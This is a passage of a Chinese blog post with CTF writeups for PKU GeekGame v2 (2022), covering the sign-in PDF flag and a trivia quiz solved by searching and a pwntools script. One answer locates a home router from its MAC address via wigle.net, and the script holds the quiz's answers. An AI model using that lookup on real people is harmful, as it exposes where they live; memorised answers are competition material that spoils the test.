<!DOCTYPE html>
<html lang="zh">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  
  
  <title>taoky&#39;s GeekGame v2 (2022) writeups</title>
  <meta name="description" content="又是新的一年，在 Hackergame 2022 结束之后，PKU 的 GeekGame 也开始了。其实我还是挺期待今年能整出什么活的。">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="https://blog.taoky.moe/2022-11-27/geekgame-v2-wp.html">
  
  
  <link rel="alternate" type="application/rss+xml" title="taoky&#39;s blog" href="https://blog.taoky.moe/feed.xml">

  <link rel="stylesheet" href="/assets/typo.css">
<link rel="stylesheet" href="/assets/fonts.css">

  <link href="/assets/fonts/bitter.css" rel="stylesheet">
  
  
  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-8N496PNK2G"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-8N496PNK2G');
    </script>
  


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">taoky's blog</a>

    <nav class="site-nav">
      <input type="checkbox" id="nav-trigger" class="nav-trigger">
      <label for="nav-trigger">
        <span class="menu-icon">
          <svg viewbox="0 0 18 15" width="18px" height="15px">
            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
          </svg>
        </span>
      </label>
      <div class="trigger">
        
        
        <a class="page-link" href="/about/">About</a>
        
        
        <a class="page-link" href="/archives/">Archives</a>
        
        
        <a class="page-link" href="/projects/">Projects</a>
        
        
        <a class="page-link" href="https://www.taoky.moe/TAsterisk">TA*</a>
        
        
        <a class="page-link" href="https://github.com/taoky">GitHub</a>
        
      </div>
    </nav>

  </div>

</header>

    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post typo" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    
      <h1 class="post-title" itemprop="name headline">taoky's GeekGame v2 (2022) writeups</h1>
    
    <p class="post-meta"><time datetime="2022-11-27T13:00:00+00:00" itemprop="datePublished">Nov 27, 2022</time> •
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/tech/">tech</a>
      
    
      
    
  


 •
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/tags/pku/">pku</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/tags/ctf/">ctf</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/tags/writeup/">writeup</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/tags/geekgame/">geekgame</a>
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  

</p>
  </header>

  
  <div class="user-toc">
    <h3>TOC | 目录</h3>
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#%E7%AD%BE%E5%88%B0">†签到†</a></li>
<li class="toc-entry toc-h2"><a href="#%E5%B0%8F%E5%8C%97%E9%97%AE%E7%AD%94--%E6%9E%81%E9%80%9F%E7%89%88">小北问答 · 极速版</a></li>
<li class="toc-entry toc-h2">
<a href="#%E7%BC%96%E5%8E%9F%E8%AF%91%E7%90%86%E4%B9%A0%E9%A2%98%E8%AF%BE">编原译理习题课</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1%E4%BA%A7%E7%89%A9%E8%B6%85%E8%BF%87-8mb">Flag 1：产物超过 8MB</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2%E6%8A%A5%E9%94%99%E8%B6%85%E8%BF%87-2mb">Flag 2：报错超过 2MB</a></li>
<li class="toc-entry toc-h3"><a href="#flag-3i-c-e">Flag 3：I C E!</a></li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#flag-checker">Flag Checker</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1java-%E9%80%86%E5%90%91">Flag 1：Java 逆向</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2javascript-%E9%80%86%E5%90%91">Flag 2：JavaScript 逆向</a></li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#%E6%99%BA%E6%85%A7%E6%A3%80%E6%B5%8B%E5%99%A8">智慧检测器</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%A5%BC%E5%B1%82">Flag 1：不存在的楼层</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2%E7%9B%B4%E7%A9%BF%E7%BB%88%E7%82%B9">Flag 2：直穿终点</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#%E6%88%91%E7%94%A8-108-%E5%A4%A9%E5%BD%95%E4%BA%86%E4%B8%AA%E9%9F%B3%E9%83%A8%E5%88%86%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5">我用 108 天录了个音（部分，第二阶段）</a></li>
<li class="toc-entry toc-h2"><a href="#%E4%BC%81%E9%B9%85%E6%96%87%E6%A1%A3">企鹅文档</a></li>
<li class="toc-entry toc-h2">
<a href="#%E7%BB%99%E9%92%B1%E4%B8%8D%E8%A6%81">给钱不要！</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1%E7%89%B9%E5%88%AB%E5%AE%89%E5%85%A8%E5%9C%B0-vivo50">Flag 1：特别安全地 vivo50</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2%E5%AE%89%E5%85%A8%E5%9C%B0%E6%89%A7%E8%A1%8C-javascript">Flag 2：安全地执行 JavaScript</a></li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#%E7%A7%81%E6%9C%89%E7%AC%94%E8%AE%B0">私有笔记</a>
<ul>
<li class="toc-entry toc-h3"><a href="#%E7%9F%A5%E8%AF%86%E4%B8%8E%E4%BD%A0%E5%88%86%E4%BA%AB">知识，与你分享</a></li>
<li class="toc-entry toc-h3"><a href="#%E6%9D%A5%E6%88%91%E5%AE%B6%E5%81%9A%E5%AE%A2%E5%90%A7">来我家做客吧</a></li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#%E4%BC%81%E4%B8%9A%E7%BA%A7%E7%90%86%E8%A7%A3">企业级理解</a>
<ul>
<li class="toc-entry toc-h3"><a href="#%E8%B5%8B%E8%83%BD%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0">赋能管理后台</a></li>
<li class="toc-entry toc-h3"><a href="#%E7%9B%98%E6%B4%BB%E4%B8%9A%E5%8A%A1%E5%A2%9E%E9%95%BF">盘活业务增长</a></li>
<li class="toc-entry toc-h3"><a href="#%E6%89%93%E9%80%9A%E6%95%B4%E4%B8%AA%E7%B3%BB%E7%BB%9F">打通整个系统</a></li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#%E8%BF%99%E4%B9%9F%E8%83%BD%E5%8D%B7">这也能卷</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1%E5%89%8D%E7%AB%AF%E7%9A%84-flag">Flag 1：前端的 flag</a></li>
<li class="toc-entry toc-h3"><a href="#flag-3nodejs-%E9%87%8C%E9%9D%A2%E7%9A%84-flag">Flag 3：Node.js 里面的 flag</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2chrome-%E9%87%8C%E7%9A%84-flag">Flag 2：Chrome 里的 flag</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#ttowrss">TTOWRSS</a></li>
<li class="toc-entry toc-h2"><a href="#%E6%AC%A1%E4%B8%96%E4%BB%A3%E7%AB%8B%E6%96%B9%E8%AE%A1%E7%AE%97%E6%9C%BA">次世代立方计算机</a></li>
<li class="toc-entry toc-h2">
<a href="#%E7%BC%96%E5%8E%9F%E8%AF%91%E7%90%86%E4%B9%A0%E9%A2%98%E8%AF%BE--%E5%AE%9E%E9%AA%8C%E7%8F%AD">编原译理习题课 · 实验班</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1safe-segfault">Flag 1：Safe segfault</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2%E5%BF%AB-main-%E4%B8%80%E6%AD%A5">Flag 2：快 main() 一步</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#381654729">381654729</a></li>
<li class="toc-entry toc-h2">
<a href="#%E4%B9%B1%E7%A0%81%E8%BF%98%E5%8E%9F">乱码还原</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1%E6%9A%B4%E5%8A%9B%E6%96%B9%E6%B3%95">Flag 1：暴力方法</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2%E7%BA%BF%E6%80%A7%E6%96%B9%E6%B3%95">Flag 2：线性方法</a></li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%8A%A0%E5%AF%86">奇怪的加密</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B0%8F%E4%BD%9C%E6%96%87">Flag 1：密码学小作文</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2md5-%E5%B0%8F%E4%BD%9C%E6%96%87">Flag 2：MD5 小作文</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#%E6%89%AB%E9%9B%B7-iiflag-1-%E9%83%A8%E5%88%86">扫雷 II（Flag 1 部分）</a></li>
<li class="toc-entry toc-h2">
<a href="#%E6%96%B9%E7%A8%8B%E7%BB%84">方程组</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1">Flag 1</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2">Flag 2</a></li>
<li class="toc-entry toc-h3"><a href="#flag-3%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5">Flag 3（第二阶段）</a></li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E9%A2%98">没做出来的题</a>
<ul>
<li class="toc-entry toc-h3"><a href="#%E6%88%91%E7%94%A8-108-%E5%A4%A9%E5%BD%95%E4%BA%86%E4%B8%AA%E9%9F%B3%E7%AC%AC%E4%BA%8C%E5%B0%8F%E9%A2%98">我用 108 天录了个音（第二小题）</a></li>
<li class="toc-entry toc-h3"><a href="#%E5%B0%8F-z-%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8">小 Z 的服务器</a></li>
<li class="toc-entry toc-h3"><a href="#%E7%AE%80%E5%8D%95%E9%A2%98">简单题</a></li>
<li class="toc-entry toc-h3"><a href="#%E6%B7%B7%E6%B7%86%E5%99%A8">混淆器</a></li>
<li class="toc-entry toc-h3"><a href="#%E6%89%AB%E9%9B%B7-ii%E7%AC%AC%E4%BA%8C%E4%B8%89%E5%B0%8F%E9%A2%98">扫雷 II（第二、三小题）</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
</ul>
  </div>
  

  <div class="post-content" itemprop="articleBody">
    <p>又是新的一年，在 Hackergame 2022 结束之后，PKU 的 GeekGame 也开始了。其实我还是挺期待今年能整出什么活的。</p>

<p>比赛的整体体验还不错，作为 hackergame staff 也能以选手的身份体会到了为了做题疯狂刷夜的感觉。最后总榜第 2 名。</p>

<p>我在赛后改的昵称是 <code class="language-plaintext highlighter-rouge">taoky | #"我是小孤独"</code>。在比赛时我的昵称前缀是 <code class="language-plaintext highlighter-rouge">ykoat</code>（即 <code class="language-plaintext highlighter-rouge">"taoky".chars().rev().collect::&lt;String&gt;()</code> 的值），后面根据每天的情况放不同的字符串。</p>

<p><img src="/pictures/geekgame-2022/bocchi.jpg" alt="I'm Bocchi"></p>

<p>让我们开始吧。</p>

<!-- more -->

<h2 id="签到">†签到†</h2>

<p>和<a href="https://blog.taoky.moe/2021-11-21/geekgame-v1-wp.html">我去年的做法</a> 完 全 一 致，甚至命令都几乎不用改：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>gs <span class="nt">-sDEVICE</span><span class="o">=</span>txtwrite <span class="nt">-o</span> - prob19.pdf
<span class="go">GPL Ghostscript 10.0.0 (2022-09-21)
Copyright (C) 2022 Artifex Software, Inc.  All rights reserved.
This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
see the file COPYING for details.
Processing pages 1 through 1.
Page 1
         WELCOME  ABOARD,
        ALL  PLAYERS!  GO  TO
        GEEKGAME.PKU.EDU.CN
        AND  SUBMIT  THE  FLAG:
   fa{el_lyr@ekaeV!
    lgHloPaesGeGm_2}
 别急 别急

</span><span class="gp">&gt;</span><span class="w"> </span><span class="c"># flag{Hello_Players@GeekGame_V2!}</span>
</code></pre></div></div>

<h2 id="小北问答--极速版">小北问答 · 极速版</h2>

<p>难度大概是搜索 + socket 编程操作的入门题。里面的题目是乱序的，并且有部分题的数字会变。我按我的笔记里面记的顺序来。</p>

<ol>
  <li>
    <p>访问网址 “http://ctf.世界一流大学.com” 时，向该主机发送的 HTTP 请求中 Host 请求头的值是什么？答案格式：^[^:\s]+$</p>

    <div class="language-console highlighter-rouge">
<div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-v</span> http://ctf.世界一流大学.com
<span class="go">*   Trying [2606:4700:3033::ac43:8e06]:80...
</span><span class="gp">* Connected to ctf.世界一流大学.com (2606:4700:3033::ac43:8e06) port 80 (#</span>0<span class="o">)</span>
<span class="gp">&gt;</span><span class="w"> </span>GET / HTTP/1.1
<span class="gp">&gt;</span><span class="w"> </span>Host: ctf.xn--4gqwbu44czhc7w9a66k.com
<span class="gp">&gt;</span><span class="w"> </span>User-Agent: curl/7.86.0
<span class="gp">&gt;</span><span class="w"> </span>Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="c">...
</span></code></pre></div>    </div>
  </li>
  <li>
    <p>我有一个朋友在美国，他无线路由器的 MAC 地址是 d2:94:35:21:42:43。请问他所在地的邮编是多少？答案格式：^\d+$</p>

    <p>直接搜这个 MAC 找不到 vendor 的信息。但是我们能否直接用 MAC 地址来定位呢？因为即使是在没有 GPS 信号的情况下，手机根据周边无线 AP 的信息，也可以获取到大概的位置。</p>

    <p>最后用很长时间一顿好找，看到了<a href="https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/">这篇文章</a>，其中指出 wigle.net 似乎是一个提供这种功能的网站。于是注册登录使用，把 MAC 输进 BSSID 里面，找到了具体的位置：</p>

    <p><img src="/pictures/geekgame-2022/wigle.png" alt="Search AP geolocation by wigle"></p>

    <p>邮编就是 80304。</p>
  </li>
  <li>
    <p>支持 WebP 图片格式的最早 Firefox 版本是多少？答案格式：^\d+$</p>

    <p><a href="https://caniuse.com/webp">https://caniuse.com/webp</a>，答案一目了然。</p>
  </li>
  <li>
    <p>视频 bilibili.com/video/BV1EV411s7vu 也可以通过 bilibili.com/video/av_____ 访问。下划线内应填什么数字？答案格式：^\d+$</p>

    <p>我记得这个转换算法的逆向还是 mcfx 搞出来的。不过这不重要。直接找个在线工具弄一下就行。我用的是 <a href="https://www.atoolbox.net/Tool.php?Id=910">https://www.atoolbox.net/Tool.php?Id=910</a>。得到 av 号为 av418645518。</p>
  </li>
  <li>
    <p>北京大学某实验室曾开发了一个叫 gStore 的数据库软件。最早描述该软件的论文的 DOI 编号是多少？答案格式：^[\d.]+\/[\d.]+$</p>

    <p>Google Scholar 搜索 gStore，得到页面 <a href="https://dl.acm.org/doi/abs/10.14778/2002974.2002976">https://dl.acm.org/doi/abs/10.14778/2002974.2002976</a>，DOI 号就是 <code class="language-plaintext highlighter-rouge">10.14778/2002974.2002976</code>。</p>
  </li>
  <li>
    <p>我刚刚在脑海中想了一个介于 9320702644 到 9320702772 之间的质数。猜猜它是多少？答案格式：^\d+$</p>

    <p>坑，因为每次这个范围都不一样。搜到了一个<a href="https://www.quora.com/Is-there-an-efficient-algorithm-to-find-the-smallest-prime-greater-than-N/answer/Nathan-Pflueger?ch=10&amp;oid=40512793&amp;share=b690130d&amp;target_type=answer">用 Miller-Rabin 判定法找下一个素数的程序代码</a>。拿过来改了改，然后之后写程序，每次都选择范围起始数字后一个素数，反正多试几次总能整出来的。（当然我拿到 flag 的时候可能没有抽到这道题吧，我也记不清楚了）</p>
  </li>
  <li>
    <p>每个 Android 软件都有唯一的包名。北京大学课外锻炼使用的最新版 PKU Runner 软件的包名是什么？答案格式：^[a-z.]+$</p>

    <p>从 https://pku-runner.github.io/ 下载，解压。包信息应该在 AndroidManifest.xml 里面，但是似乎是 Android 自己的二进制格式。搜到 <a href="https://github.com/ytsutano/axmldec">https://github.com/ytsutano/axmldec</a> 可以解析这种格式，于是编译运行之：</p>

    <div class="language-console highlighter-rouge">
<div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>./axmldec ../AndroidManifest.xml 
<span class="gp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="w">
</span><span class="gp">&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="647" android:versionName="1.22.0918" android:compileSdkVersion="33" android:compileSdkVersionCodename="13" platformBuildVersionName="13" platformBuildVersionCode="33" package="cn.edu.pku.pkurunner"&gt;</span><span class="w">
</span></code></pre></div>    </div>

    <p>包名为 cn.edu.pku.pkurunner。</p>
  </li>
  <li>
    <p>在第一届 PKU GeekGame 比赛的题目《电子游戏概论》中，通过第 14 级关卡需要多少金钱？答案格式：^\d+$</p>

    <p>看去年的 wp 仓库，<a href="https://github.com/PKU-GeekGame/geekgame-1st/blob/master/src/pygame/game/server/libtreasure.py#L19">可以读到</a>：</p>

    <div class="language-python highlighter-rouge">
<div class="highlight"><pre class="highlight"><code><span class="n">GOAL_OF_LEVEL</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">level</span><span class="p">:</span> <span class="mi">300</span><span class="o">+</span><span class="nb">int</span><span class="p">(</span><span class="n">level</span><span class="o">**</span><span class="mf">1.5</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span>
</code></pre></div>    </div>

    <p>注意，关卡数字也会变，所以要动态来。</p>
  </li>
</ol>

<p>接下来就是写程序的环节。今年换了新电脑之后 pwntools 直接 <code class="language-plaintext highlighter-rouge">pacman -S python-pwntools</code> 就能装上，所以之后都用 pwntools 来写了。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="nn">random</span>

<span class="c1"># Determines whether a is a Miller-Rabin witness of n
</span><span class="k">def</span> <span class="nf">is_witness</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span>
    <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">q</span><span class="o">%</span><span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">q</span> <span class="o">//=</span> <span class="mi">2</span>
        <span class="n">k</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">b</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">q</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="k">return</span> <span class="bp">False</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="k">return</span> <span class="bp">False</span>
        <span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="o">*</span><span class="n">b</span> <span class="o">%</span> <span class="n">n</span>
    <span class="k">return</span> <span class="bp">True</span>

<span class="c1"># Miller-Rabin test, with 100 trials by default
</span><span class="k">def</span> <span class="nf">is_prime</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">trials</span><span class="o">=</span><span class="mi">100</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">trials</span><span class="p">):</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">is_witness</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">n</span><span class="p">):</span> <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">True</span>

<span class="k">def</span> <span class="nf">next_prime</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="k">while</span> <span class="ow">not</span><span class="p">(</span><span class="n">is_prime</span><span class="p">(</span><span class="n">n</span><span class="p">)):</span> <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">n</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"prob01.geekgame.pku.edu.cn"</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"token: "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"&lt;your token&gt;"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"急急急"</span><span class="p">)</span>

<span class="n">corpus</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"bilibili"</span><span class="p">:</span> <span class="s">"418645518"</span><span class="p">,</span>
    <span class="s">"世界一流大学"</span><span class="p">:</span> <span class="s">"ctf.xn--4gqwbu44czhc7w9a66k.com"</span><span class="p">,</span>
    <span class="s">"一个朋友"</span><span class="p">:</span> <span class="s">"80304"</span><span class="p">,</span>
    <span class="s">"Firefox"</span><span class="p">:</span> <span class="s">"65"</span><span class="p">,</span>
    <span class="s">"DOI"</span><span class="p">:</span> <span class="s">"10.14778/2002974.2002976"</span><span class="p">,</span>
    <span class="s">"质数"</span><span class="p">:</span> <span class="s">"9320702711"</span><span class="p">,</span>
    <span class="s">"PKU Runner"</span><span class="p">:</span> <span class="s">"cn.edu.pku.pkurunner"</span><span class="p">,</span>
    <span class="s">"PKU GeekGame"</span><span class="p">:</span> <span class="s">"5500"</span>
<span class="p">}</span>

<span class="n">GOAL_OF_LEVEL</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">level</span><span class="p">:</span> <span class="mi">300</span><span class="o">+</span><span class="nb">int</span><span class="p">(</span><span class="n">level</span><span class="o">**</span><span class="mf">1.5</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">corpus</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">key</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="s">"质数"</span><span class="p">:</span>
                <span class="n">j</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">" "</span><span class="p">)</span>
                <span class="n">fromx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
                <span class="n">tox</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span>
                <span class="k">print</span><span class="p">(</span><span class="n">fromx</span><span class="p">,</span> <span class="n">tox</span><span class="p">)</span>
                <span class="n">res</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">next_prime</span><span class="p">(</span><span class="n">fromx</span><span class="p">))</span>
                <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="s">"PKU GeekGame"</span><span class="p">:</span>
                <span class="n">j</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">" "</span><span class="p">)</span>
                <span class="n">res</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">GOAL_OF_LEVEL</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="mi">6</span><span class="p">])))</span>
                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">corpus</span><span class="p">[</span><span class="n">key</span><span class="p">])</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="k">break</span>
    <span class="k">assert</span> <span class="n">flag</span>
